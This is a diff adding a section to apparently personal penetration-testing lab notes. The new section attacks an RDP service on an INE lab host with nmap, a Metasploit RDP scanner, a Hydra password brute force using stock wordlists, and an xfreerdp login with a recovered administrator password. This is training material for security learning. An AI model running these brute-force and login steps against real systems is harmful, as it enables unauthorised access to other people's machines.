@@ -99,3 +99,14 @@ In order to utilize PsExec to gain access to a Windows target, we will need to i
 - `dir`
 - `type flag.txt` This reveals the flag to us.
 
+### Exploiting Insecure RDP Service
+
+- `ping demo.ine.local`
+- `nmap -sV demo.ine.local` We have discovered that multiple ports are open. RDP default port is 3389. But, we have not discovered that port. We can notice that port 3333 is exposed. We can Identify RDP endpoints using an auxiliary module on port 3333 if it’s running RDP.
+- `service postgresql start && msfconsole`
+- `use auxiliary/scanner/rdp/rdp_scanner`
+- `set RHOSTS demo.ine.local`
+- `set RPORT 3333`
+- `exploit` --> Detected RDP on 10.2.28.32:3333
+- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333` Running the Hydra tool to find a valid username and password from the provided list.
+- `xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333` We have discovered four valid users and passwords. Access the remote server using xfreerdp tool.
